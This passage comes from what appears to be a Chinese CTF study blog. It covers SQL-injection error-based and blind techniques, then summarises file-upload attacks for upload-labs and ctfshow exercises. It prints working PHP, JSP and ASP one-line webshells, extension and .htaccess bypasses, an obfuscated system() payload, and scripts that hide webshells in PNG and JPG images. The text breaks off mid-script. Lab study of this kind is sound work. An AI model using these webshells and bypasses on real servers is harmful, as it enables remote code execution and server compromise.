<p>路径写入其他格式，就会报错并且会返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容</p>
<h5 id="报错注入常用到的函数"><a href="#报错注入常用到的函数" class="headerlink" title="报错注入常用到的函数"></a>报错注入常用到的函数</h5><p>Updatexml:更新xml文档的函数。<br>       语法：updatexml(文档类型，xpath路径，更新的内容)</p>
<p>Extractvalue:对XML文档进行查询的函数<br>       语法： extractvalue(文档类型，xpath路径)</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531649297-4c5226f0-2574-4d04-8458-dcf3aad2e27a.png" alt="image-20210509115330629"></p>
<h5 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h5><p>报错注入有长度限制，不同的函数限制不一样。只能截32位。</p>
<p>如果超过32位，可以分开截，先截32，再截32 。</p>
<p>或者从后往前反着截。</p>
<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p><img src="https://c.img.dasctf.com/images/20221220/1671531666330-af309926-095f-45cb-8dd5-dddc24f38173.png" alt="image-20210509120057993"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531672414-7d406572-5897-4a8e-b351-9a813d240474.png" alt="image-20210509120121018"></p>
<p>只有2种回显，永真&amp;永假。</p>
<p>永假:程序报错、查询为空</p>
<p>永真:查询正常，但不返回值</p>
<p>这种可以通过网页上的两种不同的回显的注入，称为布尔盲注。</p>
<h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>BP抓包，根据页面响应的时间来判断结果。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞总结</title>
    <url>/2021/04/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="文件上传姿势总结"><a href="#文件上传姿势总结" class="headerlink" title="文件上传姿势总结"></a>文件上传姿势总结</h1><p>对于近期学习的文件上传的方式进行一个总结。本文除去二次渲染部分，其余部分均为nep联合战队ctf入门课中，firebasky文件上传课程讲解的课件。</p>
<span id="more"></span>
<blockquote>
<p>什么是文件上传？文件上传有什么用。</p>
</blockquote>
<h2 id="文件上传漏洞介绍"><a href="#文件上传漏洞介绍" class="headerlink" title="文件上传漏洞介绍"></a>文件上传漏洞介绍</h2><blockquote>
<p>一些web应用程序中允许上传图片、视频、头像和许多其他类型的文件到服务器中。文件上传漏洞就是利用服务端代码对文件上传路径变量过滤不严格将可执行的文件上传到一个到服务器中 ，再通过URL去访问以执行恶意代码。</p>
</blockquote>
<p><a href="https://www.w3school.com.cn/php/php_file_upload.asp">文件上传</a></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>注意form表单里面的enctype属性为二进制数据multipart/form-data</code></p>
<p><strong>注释：允许用户上传文件是一个巨大的安全风险。请仅仅允许可信的用户执行文件上传操作。</strong></p>
<h3 id="php-jsp-asp小马"><a href="#php-jsp-asp小马" class="headerlink" title="php jsp asp小马"></a>php jsp asp小马</h3><blockquote>
<p>相信大家已经听了南浔姐姐讲的web第一节课，了解了一句话木马的相关操</p>
<p>作，我给没赶上上次课的同学再简单说说</p>
</blockquote>
<p><strong>介绍一些</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">0</span>]);<span class="meta">?&gt;</span> /经典的一句话木马</span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;0&quot;</span>));%&gt;</span><br><span class="line">#https://www.jianshu.com/p/123db17b78a0  #jsp木马</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%execute(request(&quot;0&quot;))%&gt;</span><br><span class="line">&#x2F;&#x2F;https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;asp&#x2F;met_execute.asp</span><br><span class="line">&#x2F;&#x2F;https:&#x2F;&#x2F;www.cnblogs.com&#x2F;xiaozi&#x2F;p&#x2F;7560907.html  #asp木马</span><br></pre></td></tr></table></figure>
<p><code>我们将一些危险的代码上传到服务器让其执行就可能危险到服务器的安全</code></p>
<h3 id="菜刀蚁剑介绍"><a href="#菜刀蚁剑介绍" class="headerlink" title="菜刀蚁剑介绍"></a>菜刀蚁剑介绍</h3><p><a href="https://www.fujieace.com/hacker/tools/antsword.html">蚁剑安装</a></p>
<p><a href="https://blog.csdn.net/qq_36235492/article/details/85713821">菜刀蚁剑</a></p>
<h3 id="文件上传如何利用？"><a href="#文件上传如何利用？" class="headerlink" title="文件上传如何利用？"></a>文件上传如何利用？</h3><p>现在我们知道了什么是文件上传和文件上传的危害，那么如何进行利用？</p>
<p>利用条件是什么？</p>
<ul>
<li>能够绕过服务器上传脚本文件(php asp jsp)</li>
<li>知道上传文件的路径和文件名</li>
</ul>
<h3 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h3><blockquote>
<p>但是一般的网站都会来验证用户上传的信息，下面介绍一下常见的校验方法和绕过方法。</p>
</blockquote>
<p>实验靶机：<a href="https://github.com/c0ny1/upload-labs">upload-labs</a><a href="https://xz.aliyun.com/t/2435">wp</a></p>
<h4 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h4><ul>
<li>javascript校验（一般只校验后缀名）upload-labs 第一关（浏览器 bp都可以）</li>
</ul>
<h4 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h4><ul>
<li><p>content-type验证 upload-labs 第二关</p>
</li>
<li><p>文件扩展名校验  (<code>白名单</code>、<code>黑名单</code>)  upload-labs 第三关</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">白名单:   png jpg gif</span><br><span class="line">黑名单:  (不能上传这些后缀名) php  jsp asp </span><br></pre></td></tr></table></figure>
</li>
<li><p>文件内容头校验（<code>GIF89a</code>）文件幻数检测</p>
</li>
<li><p>文件内容检测 (检测内容是否合法或含有恶意代码   二次渲染配合文件包含<a href="https://xz.aliyun.com/t/2657#toc-3">二次渲染</a></p>
</li>
</ul>
<h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">找漏网之鱼：php3,php4,php7等 (PHP版本&lt;5.3可使用%00截断) </span><br><span class="line">AddType application&#x2F;x-httpd-php .php .php3 .php5 .php7</span><br><span class="line"></span><br><span class="line">大小写绕过：AsP、pHP</span><br><span class="line">文件后缀双写绕过   php &quot;&quot;</span><br><span class="line"></span><br><span class="line">上传不符合windows文件命名规则的文件名 test.php:1.jpg test.php::$DATA 会被windows系统自动去掉不符合规则符号后面的内容</span><br><span class="line">配合解析漏洞绕过</span><br><span class="line"></span><br><span class="line">%00截断 (PHP&lt;5.3.4时 shell.php%00.jpg 可截断%00后的内容) 配合解析漏洞绕过</span><br><span class="line">c语言里面的%00</span><br><span class="line"></span><br><span class="line">.htaccess绕过   (apache)</span><br><span class="line">.user.ini绕过   (nginx)</span><br></pre></td></tr></table></figure>
<h5 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=".htaccess绕过"></a>.htaccess绕过</h5><p><code>如upload-labs第四关</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</span><br><span class="line">.htaccess主要的作用有：</span><br><span class="line">URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</span><br></pre></td></tr></table></figure>
<p><strong>php网站在进行解析php的时候会首先解析当前目录下的配置文件</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">1.jpg</span>&quot;&gt;</span>  //匹配文件</span><br><span class="line">        SetHandler application/x-httpd-php  </span><br><span class="line">    //SetHandler方法将1.jpg当成php代码执行</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line">// 作用范围 当前目录</span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="内容检测"><a href="#内容检测" class="headerlink" title="内容检测"></a>内容检测</h3><p><code>一般来说是对上传的文件的内容进行一个检测，比如&lt;? ?&gt; php 等等</code></p>
<p>绕过思路是去构造免杀的webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=php&gt;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">123</span>]);&lt;/script&gt;<span class="comment">#PHP5 支持</span></span><br></pre></td></tr></table></figure>
<p><strong>实验</strong></p>
<p>ctfshow web168</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;syste&#x27;</span>.<span class="string">&#x27;m&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;cat ../f*&#x27;</span>);</span><br><span class="line">array_map(<span class="variable">$func</span>, <span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure>
<h3 id="FUZZ字典"><a href="#FUZZ字典" class="headerlink" title="FUZZ字典"></a>FUZZ字典</h3><p><strong>fuzz模糊测试</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php3 php4 php5 php6</span><br></pre></td></tr></table></figure>
<p><a href="https://www.freebuf.com/articles/web/188464.html">构造优质上传漏洞Fuzz字典</a></p>
<h3 id="二次渲染的三种姿势"><a href="#二次渲染的三种姿势" class="headerlink" title="二次渲染的三种姿势"></a>二次渲染的三种姿势</h3><p>参考链接：</p>
<p><a href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">Upload-Labs第Pass-16通关（二次渲染绕过） 详解</a></p>
<h4 id="GIF绕过姿势"><a href="#GIF绕过姿势" class="headerlink" title="GIF绕过姿势"></a>GIF绕过姿势</h4><p>先用copy命令安排一个图片马：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.gif /b + <span class="built_in">cmd</span>.php /a <span class="built_in">cmd</span>.gif</span><br></pre></td></tr></table></figure>
<p>上传带马的图片，发现没有成功，于是将它下载下来。发现文件名已经变了，且写在gif末端的PHP代码已经被扬了。</p>
<p>对于GIF的二次渲染而言，我们只需要比对渲染前后没有变化的位置即可。在没有变化的部分里面插入一句话木马，即可成功绕过。</p>
<h4 id="PNG绕过姿势"><a href="#PNG绕过姿势" class="headerlink" title="PNG绕过姿势"></a>PNG绕过姿势</h4><p>PNG图片的原理在参考博客中有极为详细的解释与描述，这里就不再赘述。只复现二次渲染的方法。</p>
<p>博客里提到的第一种方法，目前未能复现成功，这种方式只针对索引彩色图像的png图片才有效，在选取png图片时可根据IHDR数据块的color type辨别.03为索引彩色图像。</p>
<p>因此复现第二种方法，通过国外大佬的脚本一键生成。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./shell.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到的一句话木马为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span><span class="variable">$_GET</span>[<span class="number">0</span>](<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用方式是get传参数0，post传参数1</p>
<p>注意：eval有时候运行不了，需要使用assert</p>
<p><code>?0=assert</code> , <code>1=phpinfo()</code></p>
<h4 id="JPG绕过姿势"><a href="#JPG绕过姿势" class="headerlink" title="JPG绕过姿势"></a>JPG绕过姿势</h4><p>未能复现成功，只写做法。</p>
<p>国外大佬的处理脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span 